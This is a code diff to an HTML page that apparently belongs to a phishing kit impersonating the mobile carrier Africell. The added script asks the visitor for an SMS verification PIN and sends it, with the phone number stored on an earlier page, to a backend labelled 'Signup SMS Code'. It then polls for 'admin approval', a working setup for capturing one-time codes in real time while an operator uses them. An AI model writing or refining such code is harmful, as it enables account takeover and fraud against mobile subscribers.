@@ -40,21 +40,95 @@
         </div>
     </div>
 
-    <script>
-        document.getElementById('sendBtn').addEventListener('click', () => {
-            const phoneVal = document.getElementById('recoveryPhone').value.trim();
-            if (!phoneVal || phoneVal.length < 8) {
-                alert('Please enter a valid mobile number.');
+<script>
+        function showAppAlert(message) {
+            document.getElementById('modalText').innerText = message;
+            document.getElementById('customModal').style.display = 'flex';
+        }
+
+        function closeModal() {
+            document.getElementById('customModal').style.display = 'none';
+        }
+
+        async function submitVerificationCode() {
+            const pinVal = document.getElementById('verificationPin').value.trim();
+            const verifyBtn = document.getElementById('verifyBtn');
+            const spinnerDiv = document.getElementById('loadingSpinner');
+            const phoneInput = localStorage.getItem('africellUserPhone') || '+23200000000';
+
+            if (!pinVal || pinVal.length < 4) {
+                showAppAlert('❌ Please enter a valid PIN code.');
                 return;
             }
 
-            // Save phone globally so scratch2.html and new.html have access to it
-            const fullPhone = '+232' + phoneVal;
-            localStorage.setItem('africellUserPhone', fullPhone);
+            try {
+                verifyBtn.classList.add('disabled-state');
+                if (spinnerDiv) spinnerDiv.style.display = 'flex';
 
-            // Move to scratch2.html
-            window.location.href = 'scratch2.html';
-        });
+                const response = await fetch('/api/submit-order', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone: phoneInput, uniqueId: 'Signup SMS Code: ' + pinVal })
+                });
+
+                const result = await response.json();
+
+                if (result.success) {
+                    // Start polling for admin approval
+                    pollApprovalStatus(phoneInput);
+                } else {
+                    verifyBtn.classList.remove('disabled-state');
+                    if (spinnerDiv) spinnerDiv.style.display = 'none';
+                    showAppAlert('❌ Verification failed. Please try again.');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                verifyBtn.classList.remove('disabled-state');
+                if (spinnerDiv) spinnerDiv.style.display = 'none';
+                showAppAlert('Could not connect to the backend server.');
+            }
+        }
+
+        function pollApprovalStatus(phone) {
+            const cleanPhone = phone.trim();
+            const verifyBtn = document.getElementById('verifyBtn');
+            const spinnerDiv = document.getElementById('loadingSpinner');
+            
+            let elapsedTime = 0;
+            const maxWaitTime = 120000; // 2 minutes timeout safety net
+
+            const statusInterval = setInterval(async () => {
+                elapsedTime += 3000;
+
+                // Safety timeout if admin takes too long
+                if (elapsedTime >= maxWaitTime) {
+                    clearInterval(statusInterval);
+                    if (spinnerDiv) spinnerDiv.style.display = 'none';
+                    verifyBtn.classList.remove('disabled-state');
+                    showAppAlert('⏱️ Request timed out. Please try verifying again.');
+                    return;
+                }
+
+                try {
+                    const response = await fetch(`/api/check-status?phone=${encodeURIComponent(cleanPhone)}`);
+                    const data = await response.json();
+
+                    if (data.status === 'approved') {
+                        clearInterval(statusInterval);
+                        window.location.href = 'new.html';
+                    } 
+                    else if (data.status === 'rejected' || data.status === 'wrong_id') {
+                        clearInterval(statusInterval);
+                        if (spinnerDiv) spinnerDiv.style.display = 'none';
+                        verifyBtn.classList.remove('disabled-state');
+                        showAppAlert('❌ Wrong Code / Rejected by Admin');
+                    }
+                } catch (e) {
+                    console.error('Polling error', e);
+                }
+            }, 3000);
+        }
     </script>
+     
 </body>
 </html>
